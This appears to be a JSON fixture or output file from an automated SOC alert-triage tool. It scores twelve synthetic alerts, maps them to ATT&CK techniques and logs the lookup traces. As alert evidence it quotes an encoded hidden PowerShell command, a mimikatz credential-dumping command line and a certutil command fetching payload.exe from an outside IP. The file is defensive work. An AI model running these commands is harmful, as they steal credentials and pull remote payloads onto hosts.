@@ -1,0 +1,1450 @@
+[
+  {
+    "alert_id": "ALT-1002",
+    "rule_name": "Suspicious PowerShell execution",
+    "priority": "P1",
+    "verdict": "true_positive",
+    "score": 100,
+    "breakdown": [
+      {
+        "factor": "vendor severity: high",
+        "points": 25
+      },
+      {
+        "factor": "host criticality: critical",
+        "points": 15
+      },
+      {
+        "factor": "privileged account involved",
+        "points": 10
+      },
+      {
+        "factor": "command line: encoded PowerShell command, hidden window",
+        "points": 35
+      },
+      {
+        "factor": "2 correlated alert(s) on same user/host/IP",
+        "points": 16
+      }
+    ],
+    "techniques": [
+      {
+        "id": "T1059.001",
+        "name": "PowerShell",
+        "tactic": "Execution"
+      }
+    ],
+    "actions": [
+      "Open a P1 incident and page the on-call responder.",
+      "Collect the PowerShell script block logs and decode the payload."
+    ],
+    "summary": "Suspicious PowerShell execution on DC01 (user: asmith) scored 100/100 -> P1 (true_positive). Key factors: command line: encoded PowerShell command, hidden window; vendor severity: high; 2 correlated alert(s) on same user/host/IP. ATT&CK: T1059.001 PowerShell.",
+    "trace": [
+      {
+        "tool": "map_mitre",
+        "args": {
+          "text": "Suspicious PowerShell execution PowerShell launched with encoded command on domain controller. powershell.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"
+        },
+        "result": {
+          "techniques": [
+            {
+              "id": "T1059.001",
+              "name": "PowerShell",
+              "tactic": "Execution"
+            }
+          ]
+        }
+      },
+      {
+        "tool": "find_related_alerts",
+        "args": {
+          "alert_id": "ALT-1002"
+        },
+        "result": {
+          "related": [
+            {
+              "id": "ALT-1001",
+              "rule_name": "Multiple failed logons followed by success",
+              "shared": [
+                "user",
+                "host",
+                "src_ip"
+              ]
+            },
+            {
+              "id": "ALT-1012",
+              "rule_name": "Account added to privileged group",
+              "shared": [
+                "user",
+                "host",
+                "src_ip"
+              ]
+            }
+          ]
+        }
+      },
+      {
+        "tool": "lookup_user_context",
+        "args": {
+          "user": "asmith"
+        },
+        "result": {
+          "user": "asmith",
+          "known": true,
+          "role": "Domain Admin",
+          "privileged": true,
+          "department": "IT"
+        }
+      },
+      {
+        "tool": "lookup_host_context",
+        "args": {
+          "host": "DC01"
+        },
+        "result": {
+          "host": "DC01",
+          "known": true,
+          "criticality": "critical",
+          "role": "Domain Controller"
+        }
+      },
+      {
+        "tool": "lookup_ip_reputation",
+        "args": {
+          "ip": "10.0.0.5"
+        },
+        "result": {
+          "ip": "10.0.0.5",
+          "verdict": "internal",
+          "tags": [],
+          "confidence": 100
+        }
+      },
+      {
+        "tool": "analyze_command_line",
+        "args": {
+          "command_line": "powershell.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"
+        },
+        "result": {
+          "indicators": [
+            {
+              "indicator": "encoded PowerShell command",
+              "weight": 25
+            },
+            {
+              "indicator": "hidden window",
+              "weight": 10
+            }
+          ],
+          "score": 35
+        }
+      }
+    ]
+  },
+  {
+    "alert_id": "ALT-1001",
+    "rule_name": "Multiple failed logons followed by success",
+    "priority": "P1",
+    "verdict": "true_positive",
+    "score": 91,
+    "breakdown": [
+      {
+        "factor": "vendor severity: medium",
+        "points": 15
+      },
+      {
+        "factor": "malicious indicator in threat intel",
+        "points": 30
+      },
+      {
+        "factor": "host criticality: critical",
+        "points": 15
+      },
+      {
+        "factor": "privileged account involved",
+        "points": 10
+      },
+      {
+        "factor": "high-impact ATT&CK tactic",
+        "points": 5
+      },
+      {
+        "factor": "2 correlated alert(s) on same user/host/IP",
+        "points": 16
+      }
+    ],
+    "techniques": [
+      {
+        "id": "T1110",
+        "name": "Brute Force",
+        "tactic": "Credential Access"
+      }
+    ],
+    "actions": [
+      "Open a P1 incident and page the on-call responder.",
+      "Reset credentials and revoke active sessions for asmith.",
+      "Block at firewall/proxy: 185.220.101.45.",
+      "Isolate host DC01 via EDR pending investigation."
+    ],
+    "summary": "Multiple failed logons followed by success on DC01 (user: asmith) scored 91/100 -> P1 (true_positive). Key factors: malicious indicator in threat intel; 2 correlated alert(s) on same user/host/IP; vendor severity: medium. ATT&CK: T1110 Brute Force.",
+    "trace": [
+      {
+        "tool": "map_mitre",
+        "args": {
+          "text": "Multiple failed logons followed by success 47 failed logons within 5 minutes from external IP followed by a successful logon (brute force password spray)."
+        },
+        "result": {
+          "techniques": [
+            {
+              "id": "T1110",
+              "name": "Brute Force",
+              "tactic": "Credential Access"
+            }
+          ]
+        }
+      },
+      {
+        "tool": "find_related_alerts",
+        "args": {
+          "alert_id": "ALT-1001"
+        },
+        "result": {
+          "related": [
+            {
+              "id": "ALT-1002",
+              "rule_name": "Suspicious PowerShell execution",
+              "shared": [
+                "user",
+                "host",
+                "dest_ip"
+              ]
+            },
+            {
+              "id": "ALT-1012",
+              "rule_name": "Account added to privileged group",
+              "shared": [
+                "user",
+                "host",
+                "dest_ip"
+              ]
+            }
+          ]
+        }
+      },
+      {
+        "tool": "lookup_user_context",
+        "args": {
+          "user": "asmith"
+        },
+        "result": {
+          "user": "asmith",
+          "known": true,
+          "role": "Domain Admin",
+          "privileged": true,
+          "department": "IT"
+        }
+      },
+      {
+        "tool": "lookup_host_context",
+        "args": {
+          "host": "DC01"
+        },
+        "result": {
+          "host": "DC01",
+          "known": true,
+          "criticality": "critical",
+          "role": "Domain Controller"
+        }
+      },
+      {
+        "tool": "lookup_ip_reputation",
+        "args": {
+          "ip": "185.220.101.45"
+        },
+        "result": {
+          "ip": "185.220.101.45",
+          "verdict": "malicious",
+          "tags": [
+            "tor-exit",
+            "bruteforce"
+          ],
+          "confidence": 95
+        }
+      },
+      {
+        "tool": "lookup_ip_reputation",
+        "args": {
+          "ip": "10.0.0.5"
+        },
+        "result": {
+          "ip": "10.0.0.5",
+          "verdict": "internal",
+          "tags": [],
+          "confidence": 100
+        }
+      }
+    ]
+  },
+  {
+    "alert_id": "ALT-1005",
+    "rule_name": "Credential dumping tool detected",
+    "priority": "P1",
+    "verdict": "true_positive",
+    "score": 90,
+    "breakdown": [
+      {
+        "factor": "vendor severity: high",
+        "points": 25
+      },
+      {
+        "factor": "host criticality: critical",
+        "points": 15
+      },
+      {
+        "factor": "privileged account involved",
+        "points": 10
+      },
+      {
+        "factor": "command line: credential dumping tool",
+        "points": 35
+      },
+      {
+        "factor": "high-impact ATT&CK tactic",
+        "points": 5
+      }
+    ],
+    "techniques": [
+      {
+        "id": "T1003",
+        "name": "OS Credential Dumping",
+        "tactic": "Credential Access"
+      }
+    ],
+    "actions": [
+      "Open a P1 incident and page the on-call responder.",
+      "Isolate the host and rotate all credentials cached on it."
+    ],
+    "summary": "Credential dumping tool detected on SQL-PROD-02 (user: svc_backup) scored 90/100 -> P1 (true_positive). Key factors: command line: credential dumping tool; vendor severity: high; host criticality: critical. ATT&CK: T1003 OS Credential Dumping.",
+    "trace": [
+      {
+        "tool": "map_mitre",
+        "args": {
+          "text": "Credential dumping tool detected Process accessed LSASS memory. mimikatz.exe privilege::debug sekurlsa::logonpasswords"
+        },
+        "result": {
+          "techniques": [
+            {
+              "id": "T1003",
+              "name": "OS Credential Dumping",
+              "tactic": "Credential Access"
+            }
+          ]
+        }
+      },
+      {
+        "tool": "find_related_alerts",
+        "args": {
+          "alert_id": "ALT-1005"
+        },
+        "result": {
+          "related": []
+        }
+      },
+      {
+        "tool": "lookup_user_context",
+        "args": {
+          "user": "svc_backup"
+        },
+        "result": {
+          "user": "svc_backup",
+          "known": true,
+          "role": "Service Account",
+          "privileged": true,
+          "department": "IT"
+        }
+      },
+      {
+        "tool": "lookup_host_context",
+        "args": {
+          "host": "SQL-PROD-02"
+        },
+        "result": {
+          "host": "SQL-PROD-02",
+          "known": true,
+          "criticality": "critical",
+          "role": "Production Database"
+        }
+      },
+      {
+        "tool": "lookup_ip_reputation",
+        "args": {
+          "ip": "10.0.3.22"
+        },
+        "result": {
+          "ip": "10.0.3.22",
+          "verdict": "internal",
+          "tags": [],
+          "confidence": 100
+        }
+      },
+      {
+        "tool": "analyze_command_line",
+        "args": {
+          "command_line": "mimikatz.exe privilege::debug sekurlsa::logonpasswords"
+        },
+        "result": {
+          "indicators": [
+            {
+              "indicator": "credential dumping tool",
+              "weight": 35
+            }
+          ],
+          "score": 35
+        }
+      }
+    ]
+  },
+  {
+    "alert_id": "ALT-1011",
+    "rule_name": "Certutil used to download file",
+    "priority": "P1",
+    "verdict": "true_positive",
+    "score": 88,
+    "breakdown": [
+      {
+        "factor": "vendor severity: medium",
+        "points": 15
+      },
+      {
+        "factor": "malicious indicator in threat intel",
+        "points": 30
+      },
+      {
+        "factor": "host criticality: medium",
+        "points": 5
+      },
+      {
+        "factor": "command line: certutil remote download",
+        "points": 25
+      },
+      {
+        "factor": "high-impact ATT&CK tactic",
+        "points": 5
+      },
+      {
+        "factor": "1 correlated alert(s) on same user/host/IP",
+        "points": 8
+      }
+    ],
+    "techniques": [
+      {
+        "id": "T1105",
+        "name": "Ingress Tool Transfer",
+        "tactic": "Command and Control"
+      }
+    ],
+    "actions": [
+      "Open a P1 incident and page the on-call responder.",
+      "Block at firewall/proxy: 203.0.113.50.",
+      "Isolate host WKS-FIN-114 via EDR pending investigation."
+    ],
+    "summary": "Certutil used to download file on WKS-FIN-114 (user: jdoe) scored 88/100 -> P1 (true_positive). Key factors: malicious indicator in threat intel; command line: certutil remote download; vendor severity: medium. ATT&CK: T1105 Ingress Tool Transfer.",
+    "trace": [
+      {
+        "tool": "map_mitre",
+        "args": {
+          "text": "Certutil used to download file certutil used to fetch remote executable. certutil -urlcache -split -f http://203.0.113.50/payload.exe C:\\Users\\jdoe\\p.exe"
+        },
+        "result": {
+          "techniques": [
+            {
+              "id": "T1105",
+              "name": "Ingress Tool Transfer",
+              "tactic": "Command and Control"
+            }
+          ]
+        }
+      },
+      {
+        "tool": "find_related_alerts",
+        "args": {
+          "alert_id": "ALT-1011"
+        },
+        "result": {
+          "related": [
+            {
+              "id": "ALT-1003",
+              "rule_name": "Phishing URL clicked",
+              "shared": [
+                "user",
+                "host",
+                "src_ip",
+                "dest_ip"
+              ]
+            }
+          ]
+        }
+      },
+      {
+        "tool": "lookup_user_context",
+        "args": {
+          "user": "jdoe"
+        },
+        "result": {
+          "user": "jdoe",
+          "known": true,
+          "role": "Accountant",
+          "privileged": false,
+          "department": "Finance"
+        }
+      },
+      {
+        "tool": "lookup_host_context",
+        "args": {
+          "host": "WKS-FIN-114"
+        },
+        "result": {
+          "host": "WKS-FIN-114",
+          "known": true,
+          "criticality": "medium",
+          "role": "Finance Workstation"
+        }
+      },
+      {
+        "tool": "lookup_ip_reputation",
+        "args": {
+          "ip": "10.1.4.114"
+        },
+        "result": {
+          "ip": "10.1.4.114",
+          "verdict": "internal",
+          "tags": [],
+          "confidence": 100
+        }
+      },
+      {
+        "tool": "lookup_ip_reputation",
+        "args": {
+          "ip": "203.0.113.50"
+        },
+        "result": {
+          "ip": "203.0.113.50",
+          "verdict": "malicious",
+          "tags": [
+            "phishing-host"
+          ],
+          "confidence": 88
+        }
+      },
+      {
+        "tool": "analyze_command_line",
+        "args": {
+          "command_line": "certutil -urlcache -split -f http://203.0.113.50/payload.exe C:\\Users\\jdoe\\p.exe"
+        },
+        "result": {
+          "indicators": [
+            {
+              "indicator": "certutil remote download",
+              "weight": 25
+            }
+          ],
+          "score": 25
+        }
+      }
+    ]
+  },
+  {
+    "alert_id": "ALT-1007",
+    "rule_name": "Outbound connection to known C2",
+    "priority": "P1",
+    "verdict": "true_positive",
+    "score": 75,
+    "breakdown": [
+      {
+        "factor": "vendor severity: high",
+        "points": 25
+      },
+      {
+        "factor": "malicious indicator in threat intel",
+        "points": 30
+      },
+      {
+        "factor": "known C2 infrastructure",
+        "points": 15
+      },
+      {
+        "factor": "high-impact ATT&CK tactic",
+        "points": 5
+      }
+    ],
+    "techniques": [
+      {
+        "id": "T1071",
+        "name": "Application Layer Protocol",
+        "tactic": "Command and Control"
+      }
+    ],
+    "actions": [
+      "Open a P1 incident and page the on-call responder.",
+      "Block at firewall/proxy: 45.155.205.233.",
+      "Isolate host WKS-ENG-207 via EDR pending investigation."
+    ],
+    "summary": "Outbound connection to known C2 on WKS-ENG-207 (user: mlee) scored 75/100 -> P1 (true_positive). Key factors: malicious indicator in threat intel; vendor severity: high; known C2 infrastructure. ATT&CK: T1071 Application Layer Protocol.",
+    "trace": [
+      {
+        "tool": "map_mitre",
+        "args": {
+          "text": "Outbound connection to known C2 Beaconing every 60s to external IP over HTTPS."
+        },
+        "result": {
+          "techniques": [
+            {
+              "id": "T1071",
+              "name": "Application Layer Protocol",
+              "tactic": "Command and Control"
+            }
+          ]
+        }
+      },
+      {
+        "tool": "find_related_alerts",
+        "args": {
+          "alert_id": "ALT-1007"
+        },
+        "result": {
+          "related": []
+        }
+      },
+      {
+        "tool": "lookup_user_context",
+        "args": {
+          "user": "mlee"
+        },
+        "result": {
+          "user": "mlee",
+          "known": true,
+          "role": "Software Engineer",
+          "privileged": false,
+          "department": "Engineering"
+        }
+      },
+      {
+        "tool": "lookup_host_context",
+        "args": {
+          "host": "WKS-ENG-207"
+        },
+        "result": {
+          "host": "WKS-ENG-207",
+          "known": true,
+          "criticality": "low",
+          "role": "Developer Workstation"
+        }
+      },
+      {
+        "tool": "lookup_ip_reputation",
+        "args": {
+          "ip": "10.2.7.207"
+        },
+        "result": {
+          "ip": "10.2.7.207",
+          "verdict": "internal",
+          "tags": [],
+          "confidence": 100
+        }
+      },
+      {
+        "tool": "lookup_ip_reputation",
+        "args": {
+          "ip": "45.155.205.233"
+        },
+        "result": {
+          "ip": "45.155.205.233",
+          "verdict": "malicious",
+          "tags": [
+            "c2",
+            "cobaltstrike"
+          ],
+          "confidence": 92
+        }
+      }
+    ]
+  },
+  {
+    "alert_id": "ALT-1003",
+    "rule_name": "Phishing URL clicked",
+    "priority": "P2",
+    "verdict": "likely_true_positive",
+    "score": 58,
+    "breakdown": [
+      {
+        "factor": "vendor severity: medium",
+        "points": 15
+      },
+      {
+        "factor": "malicious indicator in threat intel",
+        "points": 30
+      },
+      {
+        "factor": "host criticality: medium",
+        "points": 5
+      },
+      {
+        "factor": "1 correlated alert(s) on same user/host/IP",
+        "points": 8
+      }
+    ],
+    "techniques": [
+      {
+        "id": "T1566",
+        "name": "Phishing",
+        "tactic": "Initial Access"
+      }
+    ],
+    "actions": [
+      "Escalate to a tier-2 analyst within 1 hour.",
+      "Block at firewall/proxy: 203.0.113.50.",
+      "Isolate host WKS-FIN-114 via EDR pending investigation.",
+      "Search mail logs for other recipients and purge the message."
+    ],
+    "summary": "Phishing URL clicked on WKS-FIN-114 (user: jdoe) scored 58/100 -> P2 (likely_true_positive). Key factors: malicious indicator in threat intel; vendor severity: medium; 1 correlated alert(s) on same user/host/IP. ATT&CK: T1566 Phishing.",
+    "trace": [
+      {
+        "tool": "map_mitre",
+        "args": {
+          "text": "Phishing URL clicked User clicked link to login-micr0soft-support.com from email attachment."
+        },
+        "result": {
+          "techniques": [
+            {
+              "id": "T1566",
+              "name": "Phishing",
+              "tactic": "Initial Access"
+            }
+          ]
+        }
+      },
+      {
+        "tool": "find_related_alerts",
+        "args": {
+          "alert_id": "ALT-1003"
+        },
+        "result": {
+          "related": [
+            {
+              "id": "ALT-1011",
+              "rule_name": "Certutil used to download file",
+              "shared": [
+                "user",
+                "host",
+                "src_ip",
+                "dest_ip"
+              ]
+            }
+          ]
+        }
+      },
+      {
+        "tool": "lookup_user_context",
+        "args": {
+          "user": "jdoe"
+        },
+        "result": {
+          "user": "jdoe",
+          "known": true,
+          "role": "Accountant",
+          "privileged": false,
+          "department": "Finance"
+        }
+      },
+      {
+        "tool": "lookup_host_context",
+        "args": {
+          "host": "WKS-FIN-114"
+        },
+        "result": {
+          "host": "WKS-FIN-114",
+          "known": true,
+          "criticality": "medium",
+          "role": "Finance Workstation"
+        }
+      },
+      {
+        "tool": "lookup_ip_reputation",
+        "args": {
+          "ip": "10.1.4.114"
+        },
+        "result": {
+          "ip": "10.1.4.114",
+          "verdict": "internal",
+          "tags": [],
+          "confidence": 100
+        }
+      },
+      {
+        "tool": "lookup_ip_reputation",
+        "args": {
+          "ip": "203.0.113.50"
+        },
+        "result": {
+          "ip": "203.0.113.50",
+          "verdict": "malicious",
+          "tags": [
+            "phishing-host"
+          ],
+          "confidence": 88
+        }
+      },
+      {
+        "tool": "lookup_domain_reputation",
+        "args": {
+          "domain": "login-micr0soft-support.com"
+        },
+        "result": {
+          "domain": "login-micr0soft-support.com",
+          "verdict": "malicious",
+          "tags": [
+            "phishing"
+          ],
+          "confidence": 97
+        }
+      }
+    ]
+  },
+  {
+    "alert_id": "ALT-1012",
+    "rule_name": "Account added to privileged group",
+    "priority": "P3",
+    "verdict": "suspicious_needs_review",
+    "score": 36,
+    "breakdown": [
+      {
+        "factor": "vendor severity: medium",
+        "points": 15
+      },
+      {
+        "factor": "host criticality: critical",
+        "points": 15
+      },
+      {
+        "factor": "privileged account involved",
+        "points": 10
+      },
+      {
+        "factor": "2 correlated alert(s) on same user/host/IP",
+        "points": 16
+      },
+      {
+        "factor": "benign context (ticketed/scheduled/routine)",
+        "points": -20
+      }
+    ],
+    "techniques": [
+      {
+        "id": "T1098",
+        "name": "Account Manipulation",
+        "tactic": "Persistence"
+      }
+    ],
+    "actions": [
+      "Queue for analyst review within 24 hours.",
+      "Verify the change ticket and review group membership changes."
+    ],
+    "summary": "Account added to privileged group on DC01 (user: asmith) scored 36/100 -> P3 (suspicious_needs_review). Key factors: 2 correlated alert(s) on same user/host/IP; vendor severity: medium; host criticality: critical. ATT&CK: T1098 Account Manipulation.",
+    "trace": [
+      {
+        "tool": "map_mitre",
+        "args": {
+          "text": "Account added to privileged group Change ticket CHG-4821 approved: user added to Backup Operators group by IT admin during business hours."
+        },
+        "result": {
+          "techniques": [
+            {
+              "id": "T1098",
+              "name": "Account Manipulation",
+              "tactic": "Persistence"
+            }
+          ]
+        }
+      },
+      {
+        "tool": "find_related_alerts",
+        "args": {
+          "alert_id": "ALT-1012"
+        },
+        "result": {
+          "related": [
+            {
+              "id": "ALT-1001",
+              "rule_name": "Multiple failed logons followed by success",
+              "shared": [
+                "user",
+                "host",
+                "src_ip"
+              ]
+            },
+            {
+              "id": "ALT-1002",
+              "rule_name": "Suspicious PowerShell execution",
+              "shared": [
+                "user",
+                "host",
+                "src_ip"
+              ]
+            }
+          ]
+        }
+      },
+      {
+        "tool": "lookup_user_context",
+        "args": {
+          "user": "asmith"
+        },
+        "result": {
+          "user": "asmith",
+          "known": true,
+          "role": "Domain Admin",
+          "privileged": true,
+          "department": "IT"
+        }
+      },
+      {
+        "tool": "lookup_host_context",
+        "args": {
+          "host": "DC01"
+        },
+        "result": {
+          "host": "DC01",
+          "known": true,
+          "criticality": "critical",
+          "role": "Domain Controller"
+        }
+      },
+      {
+        "tool": "lookup_ip_reputation",
+        "args": {
+          "ip": "10.0.0.5"
+        },
+        "result": {
+          "ip": "10.0.0.5",
+          "verdict": "internal",
+          "tags": [],
+          "confidence": 100
+        }
+      }
+    ]
+  },
+  {
+    "alert_id": "ALT-1009",
+    "rule_name": "Port scan detected",
+    "priority": "P3",
+    "verdict": "suspicious_needs_review",
+    "score": 27,
+    "breakdown": [
+      {
+        "factor": "vendor severity: low",
+        "points": 5
+      },
+      {
+        "factor": "suspicious indicator in threat intel",
+        "points": 12
+      },
+      {
+        "factor": "host criticality: high",
+        "points": 10
+      }
+    ],
+    "techniques": [
+      {
+        "id": "T1046",
+        "name": "Network Service Discovery",
+        "tactic": "Discovery"
+      }
+    ],
+    "actions": [
+      "Queue for analyst review within 24 hours.",
+      "Confirm the target is patched and rate-limit the source IP."
+    ],
+    "summary": "Port scan detected on WEB-DMZ-01 (user: n/a) scored 27/100 -> P3 (suspicious_needs_review). Key factors: suspicious indicator in threat intel; host criticality: high; vendor severity: low. ATT&CK: T1046 Network Service Discovery.",
+    "trace": [
+      {
+        "tool": "map_mitre",
+        "args": {
+          "text": "Port scan detected External IP scanned 1200 ports on public web server."
+        },
+        "result": {
+          "techniques": [
+            {
+              "id": "T1046",
+              "name": "Network Service Discovery",
+              "tactic": "Discovery"
+            }
+          ]
+        }
+      },
+      {
+        "tool": "find_related_alerts",
+        "args": {
+          "alert_id": "ALT-1009"
+        },
+        "result": {
+          "related": []
+        }
+      },
+      {
+        "tool": "lookup_host_context",
+        "args": {
+          "host": "WEB-DMZ-01"
+        },
+        "result": {
+          "host": "WEB-DMZ-01",
+          "known": true,
+          "criticality": "high",
+          "role": "Public Web Server"
+        }
+      },
+      {
+        "tool": "lookup_ip_reputation",
+        "args": {
+          "ip": "91.240.118.172"
+        },
+        "result": {
+          "ip": "91.240.118.172",
+          "verdict": "suspicious",
+          "tags": [
+            "scanner"
+          ],
+          "confidence": 60
+        }
+      },
+      {
+        "tool": "lookup_ip_reputation",
+        "args": {
+          "ip": "10.9.0.10"
+        },
+        "result": {
+          "ip": "10.9.0.10",
+          "verdict": "internal",
+          "tags": [],
+          "confidence": 100
+        }
+      }
+    ]
+  },
+  {
+    "alert_id": "ALT-1006",
+    "rule_name": "Admin scheduled backup script",
+    "priority": "P4",
+    "verdict": "benign_or_low_risk",
+    "score": 18,
+    "breakdown": [
+      {
+        "factor": "vendor severity: low",
+        "points": 5
+      },
+      {
+        "factor": "host criticality: critical",
+        "points": 15
+      },
+      {
+        "factor": "privileged account involved",
+        "points": 10
+      },
+      {
+        "factor": "1 correlated alert(s) on same user/host/IP",
+        "points": 8
+      },
+      {
+        "factor": "benign context (ticketed/scheduled/routine)",
+        "points": -20
+      }
+    ],
+    "techniques": [
+      {
+        "id": "T1059.001",
+        "name": "PowerShell",
+        "tactic": "Execution"
+      }
+    ],
+    "actions": [
+      "Close as benign/low risk; no action required."
+    ],
+    "summary": "Admin scheduled backup script on SQL-PROD-02 (user: svc_backup) scored 18/100 -> P4 (benign_or_low_risk). Key factors: host criticality: critical; privileged account involved; 1 correlated alert(s) on same user/host/IP. ATT&CK: T1059.001 PowerShell.",
+    "trace": [
+      {
+        "tool": "map_mitre",
+        "args": {
+          "text": "Admin scheduled backup script Scheduled backup job executed from approved script path. powershell.exe -File D:\\Scripts\\nightly_backup.ps1"
+        },
+        "result": {
+          "techniques": [
+            {
+              "id": "T1059.001",
+              "name": "PowerShell",
+              "tactic": "Execution"
+            }
+          ]
+        }
+      },
+      {
+        "tool": "find_related_alerts",
+        "args": {
+          "alert_id": "ALT-1006"
+        },
+        "result": {
+          "related": [
+            {
+              "id": "ALT-1005",
+              "rule_name": "Credential dumping tool detected",
+              "shared": [
+                "user",
+                "host",
+                "src_ip"
+              ]
+            }
+          ]
+        }
+      },
+      {
+        "tool": "lookup_user_context",
+        "args": {
+          "user": "svc_backup"
+        },
+        "result": {
+          "user": "svc_backup",
+          "known": true,
+          "role": "Service Account",
+          "privileged": true,
+          "department": "IT"
+        }
+      },
+      {
+        "tool": "lookup_host_context",
+        "args": {
+          "host": "SQL-PROD-02"
+        },
+        "result": {
+          "host": "SQL-PROD-02",
+          "known": true,
+          "criticality": "critical",
+          "role": "Production Database"
+        }
+      },
+      {
+        "tool": "lookup_ip_reputation",
+        "args": {
+          "ip": "10.0.3.22"
+        },
+        "result": {
+          "ip": "10.0.3.22",
+          "verdict": "internal",
+          "tags": [],
+          "confidence": 100
+        }
+      },
+      {
+        "tool": "analyze_command_line",
+        "args": {
+          "command_line": "powershell.exe -File D:\\Scripts\\nightly_backup.ps1"
+        },
+        "result": {
+          "indicators": [],
+          "score": 0
+        }
+      }
+    ]
+  },
+  {
+    "alert_id": "ALT-1008",
+    "rule_name": "VPN login from new country",
+    "priority": "P4",
+    "verdict": "benign_or_low_risk",
+    "score": 5,
+    "breakdown": [
+      {
+        "factor": "vendor severity: medium",
+        "points": 15
+      },
+      {
+        "factor": "indicator is known-clean",
+        "points": -10
+      }
+    ],
+    "techniques": [
+      {
+        "id": "T1078",
+        "name": "Valid Accounts",
+        "tactic": "Initial Access"
+      }
+    ],
+    "actions": [
+      "Close as benign/low risk; no action required."
+    ],
+    "summary": "VPN login from new country on VPN-GW (user: rpatel) scored 5/100 -> P4 (benign_or_low_risk). Key factors: vendor severity: medium. ATT&CK: T1078 Valid Accounts.",
+    "trace": [
+      {
+        "tool": "map_mitre",
+        "args": {
+          "text": "VPN login from new country VPN login from a new location; IP belongs to corporate VPN egress."
+        },
+        "result": {
+          "techniques": [
+            {
+              "id": "T1078",
+              "name": "Valid Accounts",
+              "tactic": "Initial Access"
+            }
+          ]
+        }
+      },
+      {
+        "tool": "find_related_alerts",
+        "args": {
+          "alert_id": "ALT-1008"
+        },
+        "result": {
+          "related": []
+        }
+      },
+      {
+        "tool": "lookup_user_context",
+        "args": {
+          "user": "rpatel"
+        },
+        "result": {
+          "user": "rpatel",
+          "known": true,
+          "role": "CFO",
+          "privileged": false,
+          "department": "Executive"
+        }
+      },
+      {
+        "tool": "lookup_host_context",
+        "args": {
+          "host": "VPN-GW"
+        },
+        "result": {
+          "host": "VPN-GW",
+          "known": false,
+          "criticality": "low"
+        }
+      },
+      {
+        "tool": "lookup_ip_reputation",
+        "args": {
+          "ip": "198.51.100.23"
+        },
+        "result": {
+          "ip": "198.51.100.23",
+          "verdict": "clean",
+          "tags": [
+            "corporate-vpn"
+          ],
+          "confidence": 90
+        }
+      }
+    ]
+  },
+  {
+    "alert_id": "ALT-1004",
+    "rule_name": "Failed logon",
+    "priority": "P4",
+    "verdict": "benign_or_low_risk",
+    "score": 0,
+    "breakdown": [
+      {
+        "factor": "vendor severity: low",
+        "points": 5
+      },
+      {
+        "factor": "1 correlated alert(s) on same user/host/IP",
+        "points": 8
+      },
+      {
+        "factor": "benign context (ticketed/scheduled/routine)",
+        "points": -20
+      }
+    ],
+    "techniques": [],
+    "actions": [
+      "Close as benign/low risk; no action required."
+    ],
+    "summary": "Failed logon on WKS-ENG-207 (user: mlee) scored 0/100 -> P4 (benign_or_low_risk). Key factors: 1 correlated alert(s) on same user/host/IP; vendor severity: low. ATT&CK: no ATT&CK match.",
+    "trace": [
+      {
+        "tool": "map_mitre",
+        "args": {
+          "text": "Failed logon Single failed logon, user mistyped password then succeeded."
+        },
+        "result": {
+          "techniques": []
+        }
+      },
+      {
+        "tool": "find_related_alerts",
+        "args": {
+          "alert_id": "ALT-1004"
+        },
+        "result": {
+          "related": [
+            {
+              "id": "ALT-1007",
+              "rule_name": "Outbound connection to known C2",
+              "shared": [
+                "user",
+                "host",
+                "src_ip"
+              ]
+            }
+          ]
+        }
+      },
+      {
+        "tool": "lookup_user_context",
+        "args": {
+          "user": "mlee"
+        },
+        "result": {
+          "user": "mlee",
+          "known": true,
+          "role": "Software Engineer",
+          "privileged": false,
+          "department": "Engineering"
+        }
+      },
+      {
+        "tool": "lookup_host_context",
+        "args": {
+          "host": "WKS-ENG-207"
+        },
+        "result": {
+          "host": "WKS-ENG-207",
+          "known": true,
+          "criticality": "low",
+          "role": "Developer Workstation"
+        }
+      },
+      {
+        "tool": "lookup_ip_reputation",
+        "args": {
+          "ip": "10.2.7.207"
+        },
+        "result": {
+          "ip": "10.2.7.207",
+          "verdict": "internal",
+          "tags": [],
+          "confidence": 100
+        }
+      }
+    ]
+  },
+  {
+    "alert_id": "ALT-1010",
+    "rule_name": "Windows update download",
+    "priority": "P4",
+    "verdict": "benign_or_low_risk",
+    "score": 0,
+    "breakdown": [
+      {
+        "factor": "vendor severity: low",
+        "points": 5
+      },
+      {
+        "factor": "indicator is known-clean",
+        "points": -10
+      },
+      {
+        "factor": "1 correlated alert(s) on same user/host/IP",
+        "points": 8
+      },
+      {
+        "factor": "benign context (ticketed/scheduled/routine)",
+        "points": -20
+      }
+    ],
+    "techniques": [],
+    "actions": [
+      "Close as benign/low risk; no action required."
+    ],
+    "summary": "Windows update download on WKS-ENG-207 (user: mlee) scored 0/100 -> P4 (benign_or_low_risk). Key factors: 1 correlated alert(s) on same user/host/IP; vendor severity: low. ATT&CK: no ATT&CK match.",
+    "trace": [
+      {
+        "tool": "map_mitre",
+        "args": {
+          "text": "Windows update download Routine download from update.windows.com."
+        },
+        "result": {
+          "techniques": []
+        }
+      },
+      {
+        "tool": "find_related_alerts",
+        "args": {
+          "alert_id": "ALT-1010"
+        },
+        "result": {
+          "related": [
+            {
+              "id": "ALT-1007",
+              "rule_name": "Outbound connection to known C2",
+              "shared": [
+                "user",
+                "host",
+                "src_ip"
+              ]
+            }
+          ]
+        }
+      },
+      {
+        "tool": "lookup_user_context",
+        "args": {
+          "user": "mlee"
+        },
+        "result": {
+          "user": "mlee",
+          "known": true,
+          "role": "Software Engineer",
+          "privileged": false,
+          "department": "Engineering"
+        }
+      },
+      {
+        "tool": "lookup_host_context",
+        "args": {
+          "host": "WKS-ENG-207"
+        },
+        "result": {
+          "host": "WKS-ENG-207",
+          "known": true,
+          "criticality": "low",
+          "role": "Developer Workstation"
+        }
+      },
+      {
+        "tool": "lookup_ip_reputation",
+        "args": {
+          "ip": "10.2.7.207"
+        },
+        "result": {
+          "ip": "10.2.7.207",
+          "verdict": "internal",
+          "tags": [],
+          "confidence": 100
+        }
+      },
+      {
+        "tool": "lookup_domain_reputation",
+        "args": {
+          "domain": "update.windows.com"
+        },
+        "result": {
+          "domain": "update.windows.com",
+          "verdict": "clean",
+          "tags": [],
+          "confidence": 99
+        }
+      }
+    ]
+  }
+]
